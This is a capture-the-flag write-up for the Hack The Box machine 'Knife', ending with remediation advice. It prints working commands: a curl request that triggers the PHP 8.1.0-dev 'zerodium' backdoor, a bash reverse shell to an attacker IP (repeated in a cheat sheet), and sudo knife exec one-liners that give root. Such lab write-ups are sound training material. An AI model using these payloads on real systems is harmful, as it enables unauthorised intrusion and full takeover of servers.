# Knife (HTB) From PHP 8.1.0-dev RCE to Root via Chef Knife

**Target:** `<IP>` (Knife)
**Difficulty:** Easy  
**Vectors:** PHP 8.1.0-dev backdoor → RCE as `james` → sudo `knife` → root 

---

## 1. Reconnaissance

### 1.1 Port Scanning

```bash
nmap -sC -sV -p- --min-rate 5000 <IP>
```

Relevant results:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### 1.2 HTTP Fingerprinting

```bash
whatweb http://<IP>/
```

Key output:

```text
[200 OK] Apache[2.4.41], HTTPServer[Ubuntu Linux],
PHP[8.1.0-dev], Title[Emergent Medical Idea],
X-Powered-By[PHP/8.1.0-dev]
```

**Finding:** PHP `8.1.0-dev` is a backdoored development build. In March 2021, a malicious commit was introduced into the official PHP Git repository.

### 1.3 Directory Enumeration

```bash
ffuf -u http://<IP>/FUZZ \\
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \\
  -mc 200,301,302,403 -c
```

No significant directories were discovered. The website appears to be a static landing page titled **Emergent Medical Idea**. The PHP version is the primary attack surface.

---

## 2. Exploitation — PHP 8.1.0-dev Backdoor

### 2.1 Verifying the Vulnerability

The backdoor can be triggered using the `User-Agentt` header (note the double `t`) with a value beginning with `zerodium`, followed by PHP code to execute.

```bash
curl -s http://<IP>/ -H "User-Agentt: zerodiumsystem('id');"
```

Response:

```text
uid=1000(james) gid=1000(james) groups=1000(james)
```

**Result:** Remote code execution (RCE) as `james` is confirmed.

### 2.2 Reverse Shell

Start a listener on your attacking machine:

```bash
nc -lvnp 4444
```

Trigger the reverse shell, replacing `YOUR_IP` with your attacking machine's IP address:

```bash
curl -s http://<IP>/ \\
  -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"');"
```

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press `Ctrl+Z`, then run the following in your local terminal:

```bash
stty raw -echo; fg
export TERM=xterm
```

### 2.3 User Flag

```bash
cat ~/user.txt
```

---

## 3. Privilege Escalation

### 3.1 Basic Enumeration

Check the current user's identity:

```bash
id
```

Expected output:

```text
uid=1000(james) gid=1000(james) groups=1000(james)
```

Check sudo permissions:

```bash
sudo -l
```

Output:

```text
User james may run the following commands on knife:
    (ALL) NOPASSWD: /usr/bin/knife
```

**Finding:** The user `james` can execute `/usr/bin/knife` as any user, including root, without a password.

### 3.2 Why Knife Is Dangerous

`/usr/bin/knife` is a Chef Workstation wrapper written in Ruby. The wrapper loads the Knife executable through the embedded Ruby environment.

Example wrapper structure:

```ruby
#!/opt/chef-workstation/embedded/bin/ruby --disable-gems
...
bin_file = spec.bin_file("knife")
Kernel.load(bin_file)
```

Chef Knife includes an `exec` subcommand that executes Ruby code in the process context. When run through `sudo`, that code inherits the elevated privileges.

### 3.3 Exploitation

Execute a shell through Knife:

```bash
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
```

Verify the resulting privileges:

```bash
id
```

Expected output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Result:** Root access obtained.

### 3.4 Root Flag

```bash
cat /root/root.txt
```

---

## 4. Attack Path Summary

```text
1. nmap          → Ports 22/SSH and 80/HTTP discovered
2. whatweb       → PHP/8.1.0-dev identified
3. curl + UA     → RCE as james
4. Reverse shell → Interactive shell as james
5. sudo -l       → (ALL) NOPASSWD: /usr/bin/knife
6. knife exec    → Root shell
```

---

## 5. Findings & Remediation

### Finding 1: PHP 8.1.0-dev Backdoor

**Cause:** A compromised development build of PHP from March 2021 was installed on the server.

**Remediation:**

- Do not use development builds in production environments.
- Install PHP from trusted, verified repositories.
- Verify package signatures and checksums.
- Upgrade to a supported, trusted stable PHP release.
- Investigate software provenance and integrity if compromise is suspected.

### Finding 2: Passwordless Sudo on Knife

**Cause:** The `knife` executable supports an `exec` subcommand capable of running arbitrary Ruby code. Granting unrestricted sudo access to this binary effectively grants root-level command execution.

**Remediation:**

- Remove the unrestricted `/usr/bin/knife` entry from `/etc/sudoers`.
- If administrative access is required, grant only the minimum necessary permissions.
- Avoid granting unrestricted sudo access to interpreters or tools that can execute arbitrary code, including Ruby, Python, Perl, and Node.js.
- Review sudo rules regularly.

### Finding 3: General Hardening

**Recommendations:**

- Set `expose_php = Off` in `php.ini` to reduce PHP version disclosure.
- Monitor HTTP requests for suspicious headers and anomalous input.
- Use a WAF as an additional detection layer, not as a substitute for patching.
- Monitor Apache child processes for unexpected shell execution and reverse-shell behavior.
- Apply security updates and verify the integrity of installed software.

---

## 6. Cheat Sheet — Key Commands

### Fingerprinting

```bash
whatweb http://TARGET/
```

### Verify the PHP 8.1.0-dev Backdoor

```bash
curl -s http://TARGET/ -H "User-Agentt: zerodiumsystem('id');"
```

### Reverse Shell

Replace `IP` and `PORT` with your attacking machine's IP address and listening port.

```bash
curl -s http://TARGET/ \\
  -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\"');"
```

### Enumerate Sudo Permissions

```bash
sudo -l
```

### Escalate Privileges via Knife

```bash
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
```

---

## 7. Alternative Vectors

If `knife exec` fails because of Chef configuration issues, the following alternatives may be worth testing in the authorized lab environment.

### Set a Different Knife Home Directory

```bash
sudo KNIFE_HOME=/tmp /usr/bin/knife exec -E 'exec "/bin/sh"'
```

### Execute a System Command Through Knife

```bash
sudo /usr/bin/knife exec -E 'system("/bin/bash")'
```

### Use the Embedded Ruby Interpreter

If sudo permissions also allow execution of the embedded Ruby interpreter, a Ruby one-liner may work:

```bash
sudo /opt/chef-workstation/embedded/bin/ruby -e 'exec "/bin/sh"'
```

**Note:** The last alternative requires the Ruby interpreter itself to be permitted by the sudo policy. Permission to execute `/usr/bin/knife` does not automatically grant permission to execute the embedded Ruby binary directly.

---

## 8. Conclusion

The Knife machine demonstrates how a compromised development build can provide initial remote code execution and how overly permissive sudo rules can turn that access into root privileges.

The attack chain is:

**PHP 8.1.0-dev backdoor → RCE as `james` → unrestricted sudo access to Knife → root shell.**

